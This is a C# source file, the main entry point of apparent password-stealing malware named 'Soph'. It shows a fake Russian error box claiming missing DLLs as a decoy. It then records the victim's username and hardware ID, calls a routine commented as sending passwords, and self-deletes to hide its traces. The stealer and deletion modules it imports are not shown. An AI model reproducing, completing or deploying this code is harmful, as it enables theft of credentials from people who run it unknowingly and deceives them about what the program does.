using Soph.Hardware;
using System;
using System.Windows.Forms;
using System.IO;
using Soph.Stealer;
using Soph.Autodelete;

namespace Soph
{
  internal static class Prgrm
  {



        private static void Main()
    {
            string errror1 = "ERROR";
            string errror = "Запуск програмы невозможен из-за отсутствия нужных DLL библиотек. Обратитесь к разработчику";
            MessageBox.Show(errror, errror1);
            string pathh = System.Reflection.Assembly.GetCallingAssembly().Location;
            string rStr = Path.GetRandomFileName();

            RawSettings.Owner = string.Format("{0}", (object)Environment.UserName);
            RawSettings.Version = "1.0.0"; //Версия
            RawSettings.HWID = Identification.GetId();
            Passwords.SendFile(); //отправка паролей
            autodelete.auto_delete();
            Application.Exit();
        }

  }
}
